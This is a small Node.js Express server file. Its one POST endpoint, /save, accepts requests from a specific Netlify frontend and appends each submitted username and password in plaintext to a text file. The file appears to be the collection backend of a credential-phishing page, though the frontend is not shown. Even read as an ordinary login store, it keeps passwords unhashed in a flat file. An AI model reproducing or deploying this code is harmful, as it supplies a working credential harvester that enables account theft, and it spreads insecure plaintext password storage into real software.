const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3111;

app.use(cors({
  origin: 'https://lolak.netlify.app'  // Your Netlify frontend URL here
}));

app.use(express.json());

const DATA_FILE = path.join(__dirname, 'info.txt');

function validateInput(req, res, next) {
  const { username, password } = req.body;
  if (
    typeof username !== 'string' || username.trim() === '' ||
    typeof password !== 'string' || password.trim() === ''
  ) {
    return res.status(400).json({ error: 'Username and password are required and must be non-empty strings.' });
  }
  next();
}

app.post('/save', validateInput, (req, res) => {
  const { username, password } = req.body;
  const safeUsername = username.replace(/[\r\n:]/g, '');
  const safePassword = password.replace(/[\r\n:]/g, '');
  const data = `${safeUsername}:${safePassword}\n`;

  try {
    fs.appendFileSync(DATA_FILE, data, { encoding: 'utf8', flag: 'a' });
    res.json({ message: 'Saved successfully' });
  } catch (err) {
    console.error('Failed to write file:', err);
    res.status(500).json({ error: 'Internal Server Error' });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
